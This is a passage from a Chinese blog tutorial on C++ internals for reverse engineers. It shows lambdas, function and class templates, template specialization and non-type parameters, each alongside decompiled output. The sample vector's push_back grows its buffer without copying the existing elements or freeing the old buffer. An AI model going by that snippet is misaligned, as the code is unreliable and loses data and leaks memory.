class="number">0x55555555536c</span> (A::fun()) ◂— endbr64 </span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│     <span class="number">0x55555556aed0</span> ◂— <span class="number">0xa</span> <span class="comment">/* &#x27;\n&#x27; */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>这里的 <code>0x555555557c40</code> 就是A类的虚指针，而 <code>0x555555557c28</code> 是D类的虚基类指针</li>
</ul>
<h2 id="匿名函数-Lambda"><a href="#匿名函数-Lambda" class="headerlink" title="匿名函数 Lambda"></a>匿名函数 Lambda</h2><p>lambda 函数是一种匿名函数，它表示一个接受参数并返回一个值的函数</p>
<p>lambda 函数的语法如下： </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[capture](parameters) -&gt; return_type &#123; function_body &#125;</span><br></pre></td></tr></table></figure>
<p>测试样例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*lambda_ta)</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*lambda_tb)</span><span class="params">(<span class="keyword">int</span>,<span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">double</span> <span class="params">(*lambda_tc)</span><span class="params">(<span class="keyword">double</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">lambda_ta lambdaA = [](<span class="keyword">int</span> a) -&gt; <span class="keyword">int</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a * <span class="number">2</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">lambda_tb lambdaB = [](<span class="keyword">int</span> a,<span class="keyword">int</span> b) -&gt; <span class="keyword">int</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a * b;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x0 = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">int</span> x1 = <span class="built_in">lambdaA</span>(x0);</span><br><span class="line">    <span class="keyword">int</span> x2 = <span class="built_in">lambdaB</span>(x0,x1);</span><br><span class="line">    <span class="keyword">double</span> y0 = x1 + x2;</span><br><span class="line">    <span class="keyword">double</span> y1 = [](<span class="keyword">double</span> a) -&gt; <span class="keyword">double</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> a * <span class="number">2</span>;</span><br><span class="line">    &#125;(y0);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>在底层，局部匿名函数和全局匿名函数的实现不同</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x0 = <span class="number">5</span>;</span><br><span class="line">x1 = <span class="built_in">lambdaA</span>(<span class="number">5</span>);</span><br><span class="line">y0 = (<span class="keyword">double</span>)(x1 + <span class="built_in">lambdaB</span>(<span class="number">5</span>, x1));</span><br><span class="line">main::&#123;<span class="built_in">lambda</span>(<span class="keyword">double</span>)#<span class="number">1</span>&#125;::<span class="built_in"><span class="keyword">operator</span></span>()(&amp;__closure, y0);</span><br></pre></td></tr></table></figure>
<ul>
<li>匿名函数和普通函数本质上的区别就是：匿名函数不能通过函数名来调用</li>
<li>调用全局匿名函数其实是调用全局变量上对应的函数指针：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.data:<span class="number">0000000000004010</span>                               <span class="keyword">public</span> lambdaA</span><br><span class="line">.data:<span class="number">0000000000004010</span>                               ; lambda_ta lambdaA</span><br><span class="line">.data:<span class="number">0000000000004010</span> <span class="number">1</span>A <span class="number">12</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       lambdaA dq offset _ZN7lambdaAMUliE_4_FUNEi</span><br><span class="line">.data:<span class="number">0000000000004010</span>                                                                       ; DATA XREF: main+<span class="number">22</span>↑r</span><br><span class="line">.data:<span class="number">0000000000004018</span>                               <span class="keyword">public</span> lambdaB</span><br><span class="line">.data:<span class="number">0000000000004018</span>                               ; lambda_tb lambdaB</span><br><span class="line">.data:<span class="number">0000000000004018</span> <span class="number">55</span> <span class="number">12</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       lambdaB dq offset _ZN7lambdaBMUliiE_4_FUNEii</span><br><span class="line">.data:<span class="number">0000000000004018</span>                                                                       ; DATA XREF: main+<span class="number">33</span>↑r</span><br></pre></td></tr></table></figure>
<ul>
<li>而局部匿名函数本质上是对 <code>()</code> 的重载</li>
<li>调用局部匿名函数其实是调用对应的重载函数：</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">double</span> __cdecl main::&#123;<span class="built_in">lambda</span>(<span class="keyword">double</span>)#<span class="number">1</span>&#125;::<span class="built_in"><span class="keyword">operator</span></span>()(</span><br><span class="line">        <span class="keyword">const</span> main::$<span class="number">256B</span>327EE357AF9FCD813216707B60D5 *<span class="keyword">const</span> __closure,</span><br><span class="line">        <span class="keyword">double</span> a)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> a + a; <span class="comment">/* PS:编译器对这里进行了优化 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="泛型编程"><a href="#泛型编程" class="headerlink" title="泛型编程"></a>泛型编程</h2><p>模板是泛型编程的基础，泛型编程即以一种独立于任何特定类型的方式编写代码 </p>
<p>模板有两类：函数模板，类模板</p>
<p><strong>函数模板</strong></p>
<p>不规定某个函数的传参类型或者返回值类型</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Swap</span><span class="params">(T &amp;num1, T&amp; num2)</span></span>&#123;</span><br><span class="line">	T tmp = num1;</span><br><span class="line">	num1 = num2;</span><br><span class="line">	num2 = tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a = <span class="number">10</span>, b = <span class="number">20</span>;</span><br><span class="line">	<span class="built_in">Swap</span>(a,b); <span class="comment">/* 函数模板实例化 */</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;a :&quot;</span> &lt;&lt; a &lt;&lt; <span class="string">&quot;b :&quot;</span> &lt;&lt; b &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">float</span> c = <span class="number">10.55f</span>,  d = <span class="number">3.14f</span>;</span><br><span class="line">	<span class="built_in">Swap</span>(c, d); <span class="comment">/* 函数模板实例化 */</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;c :&quot;</span> &lt;&lt; c &lt;&lt; <span class="string">&quot;d :&quot;</span> &lt;&lt; d &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>函数模板不规定参数类型，返回值类型</li>
<li>在编译时，编译器会根据实际传参来创建不同类型的副本，这个过程被称为函数模板实例化</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">10</span>;</span><br><span class="line">b = <span class="number">20</span>;</span><br><span class="line">Swap&lt;<span class="keyword">int</span>&gt;(&amp;a, &amp;b); <span class="comment">/* 函数模板实例化(创建int类型的副本) */</span></span><br><span class="line">v3 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;std::cout, &amp;unk_2005);</span><br><span class="line">v4 = std::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)a);</span><br><span class="line">v5 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(v4, &amp;unk_2009);</span><br><span class="line">v6 = std::ostream::<span class="keyword">operator</span>&lt;&lt;(v5, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)b);</span><br><span class="line">std::ostream::<span class="keyword">operator</span>&lt;&lt;(v6, &amp;std::endl&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">c = <span class="number">10.55</span>;</span><br><span class="line">d = <span class="number">3.1400001</span>;</span><br><span class="line">Swap&lt;<span class="keyword">float</span>&gt;(&amp;c, &amp;d); <span class="comment">/* 函数模板实例化(创建float类型的副本) */</span></span><br><span class="line">v7 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;std::cout, &amp;unk_200D);</span><br><span class="line">v8 = std::ostream::<span class="keyword">operator</span>&lt;&lt;(v7, *(<span class="keyword">double</span> *)_mm_cvtsi32_si128(<span class="built_in">LODWORD</span>(c)).m128i_i64);</span><br><span class="line">v9 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(v8, &amp;unk_2011);</span><br><span class="line">v10 = std::ostream::<span class="keyword">operator</span>&lt;&lt;(v9, *(<span class="keyword">double</span> *)_mm_cvtsi32_si128(<span class="built_in">LODWORD</span>(d)).m128i_i64);</span><br><span class="line">std::ostream::<span class="keyword">operator</span>&lt;&lt;(v10, &amp;std::endl&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br></pre></td></tr></table></figure>
<p><img src="/2023/11/20/Cpp%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86+%E5%BA%95%E5%B1%82%E9%80%86%E5%90%91/1686123247822.png" alt="1686123247822">    </p>
<p>下面是一个特殊的案例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cassert&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*<span class="keyword">lambda_t</span>)</span><span class="params">(<span class="keyword">int</span>,<span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="keyword">lambda_t</span> sub = [](<span class="keyword">int</span> a,<span class="keyword">int</span> b) -&gt; <span class="keyword">int</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a-b;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> Fn&gt;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(Fn <span class="keyword">const</span> &amp;fn)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">int</span> b = <span class="number">5</span>;</span><br><span class="line">    cout &lt;&lt; <span class="built_in">fn</span>(a,b) &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">func</span>(add);</span><br><span class="line">    <span class="built_in">func</span>([](<span class="keyword">int</span> a,<span class="keyword">int</span> b) -&gt; <span class="keyword">int</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> a * b;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="built_in">func</span>(sub);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>函数模板和类模板都可以将 “函数指针” 当做类型</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">func&lt;<span class="built_in"><span class="keyword">int</span></span> ()(<span class="keyword">int</span>,<span class="keyword">int</span>)&gt;((<span class="built_in"><span class="keyword">int</span></span> (*)(<span class="keyword">int</span>, <span class="keyword">int</span>))add); <span class="comment">/* 普通函数 */</span></span><br><span class="line">func&lt;main::&#123;<span class="built_in">lambda</span>(<span class="keyword">int</span>,<span class="keyword">int</span>)#<span class="number">1</span>&#125;&gt;(&amp;fn); <span class="comment">/* 局部匿名函数 */</span></span><br><span class="line">func&lt;<span class="built_in"><span class="keyword">int</span></span> (*)(<span class="keyword">int</span>,<span class="keyword">int</span>)&gt;(&amp;sub); <span class="comment">/* 全局匿名函数 */</span></span><br></pre></td></tr></table></figure>
<p><strong>类模板</strong></p>
<p>不规定该类中某个函数的传参类型或返回值类型</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cassert&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> mzt &#123;</span><br><span class="line">    <span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">vector</span> &#123;</span></span><br><span class="line">        <span class="keyword">public</span>:</span><br><span class="line">        <span class="built_in">vector</span>() : _a(<span class="literal">nullptr</span>),_size(<span class="number">0</span>),_capacity(<span class="number">0</span>)&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">push_back</span><span class="params">(<span class="keyword">const</span> T&amp; data)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (_capacity == _size) &#123;</span><br><span class="line">                <span class="keyword">size_t</span> newcapacity = _capacity == <span class="number">0</span> ? <span class="number">4</span> : _capacity * <span class="number">2</span>;</span><br><span class="line">                T* tmp = <span class="keyword">new</span> T[newcapacity];</span><br><span class="line">                <span class="built_in">assert</span>(tmp);</span><br><span class="line">                _a = tmp;</span><br><span class="line">                _capacity = newcapacity;</span><br><span class="line">            &#125;</span><br><span class="line">            _a[_size++] = data;</span><br><span class="line">        &#125;</span><br><span class="line">        T&amp; <span class="keyword">operator</span>[](<span class="keyword">size_t</span> pos) &#123;</span><br><span class="line">            <span class="built_in">assert</span>(pos &lt; _size);</span><br><span class="line">            <span class="keyword">return</span> _a[pos];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">size_t</span> <span class="title">getsize</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> _size;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">private</span>:</span><br><span class="line">        T*  _a;</span><br><span class="line">        <span class="keyword">size_t</span> _size;</span><br><span class="line">        <span class="keyword">size_t</span> _capacity;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    mzt::vector&lt;<span class="keyword">int</span>&gt; a; <span class="comment">/* 类模板实例化 */</span></span><br><span class="line">    a.<span class="built_in">push_back</span>(<span class="number">1</span>);</span><br><span class="line">    a.<span class="built_in">push_back</span>(<span class="number">2</span>);</span><br><span class="line">    mzt::vector&lt;<span class="keyword">double</span>&gt; b; <span class="comment">/* 类模板实例化 */</span></span><br><span class="line">    b.<span class="built_in">push_back</span>(<span class="number">3.0</span>);</span><br><span class="line">    b.<span class="built_in">push_back</span>(<span class="number">4.0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>类模板实例化与函数模板实例化不同</li>
<li>类模板实例化需要在类模板名字后跟 <code>&lt;&gt;</code> 指定类型（函数模板实例化也可以用 <code>&lt;&gt;</code> 指定类型，即使没有，编译器也会自动识别类型）</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mzt::vector&lt;<span class="keyword">int</span>&gt;::<span class="built_in">vector</span>(&amp;a); <span class="comment">/* 类模板实例化 */</span></span><br><span class="line"><span class="built_in">LODWORD</span>(b._a) = <span class="number">1</span>;</span><br><span class="line">mzt::vector&lt;<span class="keyword">int</span>&gt;::<span class="built_in">push_back</span>(&amp;a, (<span class="keyword">const</span> <span class="keyword">int</span> *)&amp;b);</span><br><span class="line"><span class="built_in">LODWORD</span>(b._a) = <span class="number">2</span>;</span><br><span class="line">mzt::vector&lt;<span class="keyword">int</span>&gt;::<span class="built_in">push_back</span>(&amp;a, (<span class="keyword">const</span> <span class="keyword">int</span> *)&amp;b);</span><br><span class="line">mzt::vector&lt;<span class="keyword">double</span>&gt;::<span class="built_in">vector</span>(&amp;b); <span class="comment">/* 类模板实例化 */</span></span><br><span class="line">data = <span class="number">3.0</span>;</span><br><span class="line">mzt::vector&lt;<span class="keyword">double</span>&gt;::<span class="built_in">push_back</span>(&amp;b, &amp;data);</span><br><span class="line">data = <span class="number">4.0</span>;</span><br><span class="line">mzt::vector&lt;<span class="keyword">double</span>&gt;::<span class="built_in">push_back</span>(&amp;b, &amp;data);</span><br></pre></td></tr></table></figure>
<p><strong>模板特例化</strong></p>
<p>在原模板类的基础上，针对特殊类型所进行特殊化的实现方式</p>
<p>模板特化中分为：函数模板特化，类模板特化</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">IsEqual</span><span class="params">(<span class="keyword">int</span> left, <span class="keyword">int</span> right)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> left == right;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;class T&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">IsEqual</span><span class="params">(<span class="keyword">const</span> T&amp; left, <span class="keyword">const</span> T&amp; right)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> left == right;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt; &gt; </span><br><span class="line"><span class="keyword">bool</span> IsEqual&lt;<span class="keyword">const</span> <span class="keyword">char</span> *&gt;(<span class="keyword">const</span> <span class="keyword">char</span>* <span class="keyword">const</span>&amp; left, </span><br><span class="line">			<span class="keyword">const</span> <span class="keyword">char</span>* <span class="keyword">const</span>&amp; right) &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">strcmp</span>(left, right) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> b = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* p1 = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span>* p2 = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    <span class="keyword">bool</span> ret;</span><br><span class="line">    </span><br><span class="line">    ret = <span class="built_in">IsEqual</span>(a, b);</span><br><span class="line">	ret = IsEqual&lt;<span class="keyword">int</span>&gt;(a, b);</span><br><span class="line">	ret = IsEqual&lt;<span class="keyword">const</span> <span class="keyword">char</span>*&gt;(p1, p2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">v4 = <span class="number">0</span>;</span><br><span class="line">v5 = <span class="number">1</span>;</span><br><span class="line">v6 = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">v7[<span class="number">0</span>] = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="built_in">IsEqual</span>(<span class="number">0</span>, <span class="number">1</span>); <span class="comment">/* 调用普通函数(最优先) */</span></span><br><span class="line">IsEqual&lt;<span class="keyword">int</span>&gt;(&amp;v4, &amp;v5); <span class="comment">/* 调用模板函数 */</span></span><br><span class="line">IsEqual&lt;<span class="keyword">char</span> <span class="keyword">const</span>*&gt;(&amp;v6, v7); <span class="comment">/* 调用特例化的模板函数(次优先) */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>如果遇到相同普通函数（函数名和类型都相同），编译器则会优先调用普通函数（最优先）</li>
<li>如果指定类型匹配，特例化的模板函数会比普通的模板函数优先调用（次优先）</li>
</ul>
<p><strong>类型形参 &amp; 非类型形参</strong></p>
<p>模板参数分类：类型形参、非类型形参</p>
<ul>
<li>类型形参：出现在模板参数列表中，跟在 class 或者 typename 之后的参数类型名称</li>
<li>非类型形参：就是用一个常量作为类(函数)模板的一个参数，在类(函数)模板中可将该参数当成常量来使用 </li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cassert&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> mzt &#123;</span><br><span class="line">	<span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span> =</span> <span class="keyword">int</span>, <span class="keyword">size_t</span> N = <span class="number">10</span>&gt; <span class="comment">/* T为类型形参,N为非类型形参 */</span></span><br><span class="line">	class Array &#123;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">    T&amp; <span class="keyword">operator</span>[](<span class="keyword">size_t</span> pos) &#123; <span class="comment">/* 重载[] */</span></span><br><span class="line">        <span class="keyword">return</span> arr[pos];</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">private</span>:</span><br><span class="line">		T arr[N];</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	mzt::Array&lt; &gt; a; <span class="comment">/* 不提供模板参数,使用缺省值 */</span></span><br><span class="line">    a[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">    a[<span class="number">1</span>]=<span class="number">2</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*mzt::Array&lt;<span class="keyword">int</span>,<span class="number">10ul</span>&gt;::<span class="keyword">operator</span>[](&amp;a, <span class="number">0LL</span>) = <span class="number">1</span>;</span><br><span class="line">*mzt::Array&lt;<span class="keyword">int</span>,<span class="number">10ul</span>&gt;::<span class="keyword">operator</span>[](&amp;a, <span class="number">1uLL</span>) = <span class="number">2</span>;</span><br></pre></td></tr></table></figure>
